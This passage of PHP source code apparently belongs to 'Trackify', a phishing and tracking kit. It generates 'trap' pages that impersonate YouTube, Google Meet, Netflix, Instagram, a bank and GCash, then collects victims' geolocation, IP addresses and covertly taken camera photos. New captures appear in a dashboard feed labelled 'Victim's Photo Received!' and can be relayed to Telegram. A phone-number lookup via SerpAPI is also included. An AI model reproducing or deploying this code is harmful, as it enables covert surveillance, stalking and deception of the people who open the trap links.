    $template = normalize_template_id($template);
    $templates = [
        1 => 'Youtube.html',
        2 => 'Gmeet.html',
        3 => 'Sensitive.html',
        4 => 'Netflix.html',
        5 => 'Instagram.html',
        6 => 'Bank.html',
        7 => 'GCash.html',
    ];

    $templateFile = $templates[$template];
    $templatePath = $baseDir . '/' . $templateFile;

    $stamp = bin2hex(random_bytes(6)) . '-' . $template . '-' . (string) time();

    if (!is_readable($templatePath)) {
        return ['ok' => false, 'template_id' => $template, 'stamp' => $stamp];
    }

    $htmlContent = file_get_contents($templatePath);
    if ($htmlContent === false || $htmlContent === '') {
        return ['ok' => false, 'template_id' => $template, 'stamp' => $stamp];
    }

    $templatePhpPath = $baseDir . '/template.php';
    $templateContent = file_get_contents($templatePhpPath);
    if ($templateContent === false || $templateContent === '') {
        return ['ok' => false, 'template_id' => $template, 'stamp' => $stamp];
    }

    $tplId = (string) $template;
    $indexPhp = str_replace(
        ['forwarding_link', '__TRACKIFY_TID__', '__TRACKIFY_PF__', '__TPLID__'],
        [$link, $trackerToken, rawurlencode($stamp), $tplId],
        $templateContent
    );
    if (@file_put_contents($baseDir . '/index.php', $indexPhp, LOCK_EX) === false) {
        return ['ok' => false, 'template_id' => $template, 'stamp' => $stamp];
    }

    $htmlContent = str_replace(['forwarding_link', '__TRACKIFY_TID__'], [$link, $trackerToken], $htmlContent);

    // Root-relative API URLs (trap page must POST to /post.php etc., not a subpath).
    $baseUrlLine = "var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');";
    $htmlContent = str_replace($baseUrlLine, "var BASE_URL = window.location.origin + '/';", $htmlContent);

    if ($template === 1) {
        $htmlContent = str_replace('live_yt_tv', (string) $ytVideoId, $htmlContent);
    }

    $metaNoCache = '<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">' . "\n"
        . '<meta http-equiv="Pragma" content="no-cache">' . "\n";

    if (preg_match('/<head\b[^>]*>/i', $htmlContent)) {
        $htmlContent = preg_replace('/<head\b[^>]*>/i', '$0' . $metaNoCache, $htmlContent, 1);
    }

    if (preg_match('/<body\b/i', $htmlContent)) {
        $inject = '<script>window.TRACKIFY_TID=' . json_encode($trackerToken, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) . ';</script>';
        $htmlContent = preg_replace('/<body\b[^>]*>/i', '$0' . $inject, $htmlContent, 1);
    }

    // One file per template so the URL path changes when the user picks a different template (no shared index2.html cache).
    $trapPath = $baseDir . '/trap-' . $tplId . '.html';
    $written = @file_put_contents($trapPath, $htmlContent, LOCK_EX) !== false;

    return ['ok' => $written, 'template_id' => $template, 'stamp' => $stamp, 'trap_file' => 'trap-' . $tplId . '.html'];
}

function handleDiag(): void
{
    global $baseDir;

    $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
    $traps = [];
    for ($i = 1; $i <= 7; $i++) {
        $f = $baseDir . '/trap-' . $i . '.html';
        $traps['trap-' . $i . '.html'] = file_exists($f) ? filesize($f) : -1;
    }
    $idx = $baseDir . '/index.php';
    $indexHead = '';
    if (is_readable($idx)) {
        $indexHead = substr(preg_replace('/\s+/', ' ', (string) file_get_contents($idx)), 0, 280);
    }

    echo json_encode([
        'status' => 'success',
        'base_dir' => $baseDir,
        'dir_writable' => is_writable($baseDir),
        'config_template' => $config['template'] ?? null,
        'config_owned' => config_owned_by_session($config),
        'trap_files' => $traps,
        'index_php_snippet' => $indexHead,
    ]);
}

function handlePhoneLookup(): void
{
    $uid = dashboard_session_user_id();
    $number = trim((string)($_GET['number'] ?? ''));
    if ($number === '') {
        echo json_encode(['status' => 'error', 'message' => 'number required']);
        return;
    }

    $apiKey = serpapi_api_key();
    if ($apiKey === null) {
        echo json_encode([
            'status' => 'error',
            'message' => 'SerpAPI key not configured. Set serpapi_key in config.php or SERPAPI_API_KEY env.',
        ]);
        return;
    }

    $query = '"' . $number . '"';
    $params = [
        'engine' => 'google',
        'q' => $query,
        'num' => 10,
        'api_key' => $apiKey,
    ];

    $url = 'https://serpapi.com/search?' . http_build_query($params);

    $ctx = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => 10,
            'ignore_errors' => true,
        ],
        'ssl' => [
            'verify_peer' => true,
            'verify_peer_name' => true,
        ],
    ]);

    $raw = @file_get_contents($url, false, $ctx);
    if ($raw === false) {
        echo json_encode(['status' => 'error', 'message' => 'Search request failed']);
        return;
    }

    $json = json_decode($raw, true);
    if (!is_array($json)) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid search response']);
        return;
    }

    // Extract URLs (with title/snippet) from organic_results
    $urls = [];
    if (!empty($json['organic_results']) && is_array($json['organic_results'])) {
        foreach ($json['organic_results'] as $res) {
            if (empty($res['link']) || !is_string($res['link'])) {
                continue;
            }
            $urls[] = [
                'url' => $res['link'],
                'title' => isset($res['title']) && is_string($res['title']) ? $res['title'] : '',
                'snippet' => isset($res['snippet']) && is_string($res['snippet']) ? $res['snippet'] : '',
            ];
        }
    }

    // Save scan history if DB is available
    $saved = false;
    if ($uid > 0) {
        $pdo = trackify_pdo();
        if ($pdo instanceof PDO) {
            try {
                $stmt = $pdo->prepare('
                    INSERT INTO phone_scan_history (user_id, phone_number, url_count, urls_json, created_at)
                    VALUES (?, ?, ?, ?, NOW())
                ');
                $stmt->execute([$uid, $number, count($urls), json_encode($urls)]);
                $saved = true;
            } catch (Throwable $e) {
                $saved = false;
            }
        }
    }

    echo json_encode([
        'status' => 'success',
        'number' => $number,
        'urls' => $urls,
        'saved' => $saved,
    ]);
}

function handlePhoneHistory(): void
{
    $uid = dashboard_session_user_id();
    if ($uid <= 0) {
        echo json_encode(['status' => 'error', 'message' => 'Authentication required']);
        return;
    }

    $pdo = trackify_pdo();
    if (!$pdo instanceof PDO) {
        echo json_encode(['status' => 'error', 'message' => 'Database not available']);
        return;
    }

    try {
        $stmt = $pdo->prepare('
            SELECT id, phone_number, url_count, urls_json, created_at
            FROM phone_scan_history
            WHERE user_id = ?
            ORDER BY created_at DESC
            LIMIT 20
        ');
        $stmt->execute([$uid]);
        $rows = $stmt->fetchAll();
    } catch (Throwable $e) {
        echo json_encode(['status' => 'error', 'message' => 'Could not load history']);
        return;
    }

    $history = [];
    foreach ($rows as $row) {
        $urls = [];
        if (!empty($row['urls_json'])) {
            $decoded = json_decode($row['urls_json'], true);
            if (is_array($decoded)) {
                $urls = $decoded;
            }
        }
        $history[] = [
            'id' => (int) $row['id'],
            'phone_number' => (string) $row['phone_number'],
            'url_count' => (int) $row['url_count'],
            'urls' => $urls,
            'created_at' => (string) $row['created_at'],
        ];
    }

    echo json_encode([
        'status' => 'success',
        'history' => $history,
    ]);
}

function handleCaptures(): void
{
    $uid = dashboard_session_user_id();
    $captureDir = trackify_user_capture_dir($uid);
    $relPrefix = 'data/captures/u' . $uid;

    $data = ['geolocations' => [], 'ips' => [], 'photos' => []];

    $geoFile = $captureDir . '/geolocations.json';
    if (file_exists($geoFile)) {
        $geo = json_decode(file_get_contents($geoFile), true);
        $data['geolocations'] = is_array($geo) ? array_slice($geo, -50) : [];
    }

    $ipFile = $captureDir . '/saved.ip.txt';
    if (file_exists($ipFile)) {
        $content = file_get_contents($ipFile);
        $entries = [];
        $lines = explode("\n", $content);
        $current = [];
        foreach ($lines as $line) {
            if (preg_match('/IP:\s*(.+)/', $line, $m)) {
                $current['ip'] = trim($m[1]);
            } elseif (preg_match('/IP Address:\s*(.+)/', $line, $m)) {
                $current['ip'] = trim($m[1]);
            }
            if (preg_match('/Time:\s*(.+)/', $line, $m)) {
                $current['time'] = trim($m[1]);
            } elseif (preg_match('/⏰\s*Time:\s*(.+)/u', $line, $m)) {
                $current['time'] = trim($m[1]);
            }
            if (!empty($current['ip']) && !empty($current['time'])) {
                $entries[] = $current;
                $current = [];
            }
        }
        $data['ips'] = array_slice($entries, -20);
    }

    $folders = glob($captureDir . '/20*', GLOB_ONLYDIR) ?: [];
    foreach (array_reverse($folders) as $folder) {
        $imgs = glob($folder . '/*.png') ?: [];
        foreach (array_slice($imgs, -5) as $img) {
            $data['photos'][] = [
                'path' => $relPrefix . '/' . basename(dirname($img)) . '/' . basename($img),
                'user_id' => $uid,
            ];
        }
    }

    echo json_encode([
        'status' => 'success',
        'user_id' => $uid,
        'data' => $data,
    ]);
}

function handlePhotos(): void
{
    $uid = dashboard_session_user_id();
    $captureDir = trackify_user_capture_dir($uid);
    $relPrefix = 'data/captures/u' . $uid;

    $page = max(1, (int) ($_GET['page'] ?? 1));
    $perPage = min(24, max(8, (int) ($_GET['per_page'] ?? 12)));

    $allPhotos = [];
    $folders = glob($captureDir . '/20*', GLOB_ONLYDIR) ?: [];
    foreach (array_reverse($folders) as $folder) {
        $imgs = glob($folder . '/*.png') ?: [];
        foreach ($imgs as $img) {
            $filename = basename($img);
            $folderName = basename($folder);
            $allPhotos[] = [
                'path' => $relPrefix . '/' . $folderName . '/' . $filename,
                'date' => filemtime($img),
                'filename' => $filename,
                'user_id' => $uid,
            ];
        }
    }

    usort($allPhotos, function ($a, $b) {
        return $b['date'] - $a['date'];
    });

    $total = count($allPhotos);
    $maxCaptures = trackify_max_photo_captures();
    $totalPages = $total ? (int) ceil($total / $perPage) : 1;
    $offset = ($page - 1) * $perPage;
    $photos = array_slice($allPhotos, $offset, $perPage);

    echo json_encode([
        'status' => 'success',
        'user_id' => $uid,
        'photos' => $photos,
        'capture_quota' => [
            'max' => $maxCaptures,
            'used' => $total,
            'full' => $total >= $maxCaptures,
        ],
        'pagination' => [
            'page' => $page,
            'per_page' => $perPage,
            'total' => $total,
            'total_pages' => $totalPages,
            'has_prev' => $page > 1,
            'has_next' => $page < $totalPages,
        ],
    ]);
}

function handleDeletePhotos(): void
{
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['status' => 'error', 'message' => 'POST required']);

        return;
    }

    $uid = dashboard_session_user_id();
    $raw = file_get_contents('php://input');
    $input = json_decode($raw, true);
    if (!is_array($input)) {
        $input = $_POST;
    }
    $paths = $input['paths'] ?? null;
    if (!is_array($paths)) {
        echo json_encode(['status' => 'error', 'message' => 'paths must be a JSON array']);

        return;
    }

    $paths = array_values(array_filter(array_map('strval', $paths)));
    if (count($paths) > 100) {
        echo json_encode(['status' => 'error', 'message' => 'Too many paths (max 100)']);

        return;
    }

    $deleted = 0;
    $failed = 0;
    foreach ($paths as $p) {
        $abs = trackify_resolve_user_photo_file($uid, $p);
        if ($abs === null) {
            $failed++;

            continue;
        }
        if (@unlink($abs)) {
            $deleted++;
        } else {
            $failed++;
        }
    }

    echo json_encode([
        'status' => 'success',
        'deleted' => $deleted,
        'failed' => $failed,
    ]);
}

function handleClearCaptures(): void
{
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['status' => 'error', 'message' => 'POST required']);
        return;
    }

    $uid = dashboard_session_user_id();
    $dir = trackify_user_capture_dir($uid);

    $files = [
        $dir . '/geolocations.json',
        $dir . '/saved.ip.txt',
        $dir . '/location_notify.txt',
        $dir . '/ip_pending.txt',
        $dir . '/photo_pending.flag',
    ];

    $cleared = 0;
    foreach ($files as $file) {
        if (!file_exists($file)) {
            continue;
        }
        if (@unlink($file)) {
            $cleared++;
        }
    }

    echo json_encode([
        'status' => 'success',
        'message' => 'Capture history cleared',
        'cleared' => $cleared,
    ]);
}

function handleStatus(): void
{
    global $baseDir;

    $config = reconcile_dashboard_config_for_session($baseDir, read_dashboard_config($baseDir));
    $sendlink = $baseDir . '/sendlink';
    $hasLink = file_exists($sendlink) && filesize($sendlink) > 0;
    $link = null;
    if ($hasLink && config_owned_by_session($config)) {
        $link = extract_trycloudflare_url($sendlink);
    }

    $telegramConfig = $baseDir . '/telegram_config.json';
    $telegramEnabled = file_exists($telegramConfig);

    echo json_encode([
        'status' => 'success',
        'tunnel_active' => (bool) $link,
        'link' => $link,
        'telegram_configured' => $telegramEnabled,
    ]);
}

function handleTerminal(): void
{
    $uid = dashboard_session_user_id();
    $dir = trackify_user_capture_dir($uid);

    $events = [];

    $loc = $dir . '/location_notify.txt';
    if (file_exists($loc)) {
        $content = file_get_contents($loc);
        $events[] = ['type' => 'location', 'content' => $content];
        @unlink($loc);
    }

    $ipPending = $dir . '/ip_pending.txt';
    if (file_exists($ipPending)) {
        $content = file_get_contents($ipPending);
        $events[] = ['type' => 'ip', 'content' => $content];
        @file_put_contents($dir . '/saved.ip.txt', $content . "\n", FILE_APPEND | LOCK_EX);
        @unlink($ipPending);
    }

    $photoFlag = $dir . '/photo_pending.flag';
    if (file_exists($photoFlag)) {
        $events[] = ['type' => 'photo', 'content' => 'Victim\'s Photo Received!'];
        @unlink($photoFlag);
    }

    echo json_encode(['status' => 'success', 'events' => $events]);
}

function handleTelegramConfig(): void
{
    global $baseDir;

    if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
        echo json_encode(['status' => 'error', 'message' => 'GET required']);
        return;
    }

    $path = $baseDir . '/telegram_config.json';
    if (!is_file($path)) {
        echo json_encode(['status' => 'success', 'configured' => false]);
        return;
    }

    $raw = @file_get_contents($path);
    $j = is_string($raw) ? json_decode($raw, true) : null;
    if (!is_array($j)) {
        echo json_encode(['status' => 'success', 'configured' => false]);
        return;
    }

    $botToken = trim((string) ($j['bot_token'] ?? ''));
    $chatId = trim((string) ($j['chat_id'] ?? ''));
    if ($botToken === '' || $chatId === '') {
        echo json_encode(['status' => 'success', 'configured' => false]);
        return;
    }

    echo json_encode([
        'status' => 'success',
        'configured' => true,
        'bot_token' => $botToken,
        'chat_id' => $chatId,
    ]);
}

function handleTelegram(): void
{
    global $baseDir;

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['status' => 'error', 'message' => 'POST required']);
        return;
    }

    $input = json_decode(file_get_contents('php://input'), true) ?: $_POST;

    $botToken = trim((string) ($input['bot_token'] ?? ''));
    $chatId = trim((string) ($input['chat_id'] ?? ''));

    if ($botToken === '' || $chatId === '') {
        echo json_encode(['status' => 'error', 'message' => 'bot_token and chat_id required']);
        return;
    }

    $config = ['bot_token' => $botToken, 'chat_id' => $chatId];
    if (@file_put_contents($baseDir . '/telegram_config.json', json_encode($config, JSON_PRETTY_PRINT), LOCK_EX) === false) {
        echo json_encode(['status' => 'error', 'message' => 'Could not write telegram_config.json']);

        return;
    }

    echo json_encode(['status' => 'success', 'message' => 'Telegram config saved']);
}

function handleTelegramTest(): void
{
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo json_encode(['status' => 'error', 'message' => 'POST required']);
        return;
    }

    $input = json_decode(file_get_contents('php://input'), true) ?: $_POST;
    $botToken = trim((string) ($input['bot_token'] ?? ''));
    $chatId = trim((string) ($input['chat_id'] ?? ''));

    if ($botToken === '' || $chatId === '') {
        echo json_encode(['status' => 'error', 'message' => 'Bot token and chat ID are required']);

        return;
    }

    $url = 'https://api.telegram.org/bot' . rawurlencode($botToken) . '/sendMessage';
    $payload = json_encode([
        'chat_id' => $chatId,
        'text' => 'Trackify: test notification — your bot can reach this chat.',
        'disable_web_page_preview' => true,
    ]);
    if ($payload === false) {
        echo json_encode(['status' => 'error', 'message' => 'Could not build Telegram request']);

        return;
    }

    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $payload,
            'timeout' => 20,
            'ignore_errors' => true,
        ],
        'ssl' => [
            'verify_peer' => true,
            'verify_peer_name' => true,
        ],
    ]);

    $raw = @file_get_contents($url, false, $ctx);
    if ($raw === false || $raw === '') {
        echo json_encode(['status' => 'error', 'message' => 'Could not reach Telegram. Check token, network, and SSL.']);

        return;
    }

    $json = json_decode($raw, true);
    if (!is_array($json)) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid response from Telegram']);

        return;
    }

    if (empty($json['ok'])) {
        $desc = isset($json['description']) && is_string($json['description']) ? $json['description'] : 'Telegram API error';

        echo json_encode(['status' => 'error', 'message' => $desc]);

        return;
    }

    echo json_encode(['status' => 'success', 'message' => 'Test message sent. Check your Telegram chat.']);
}
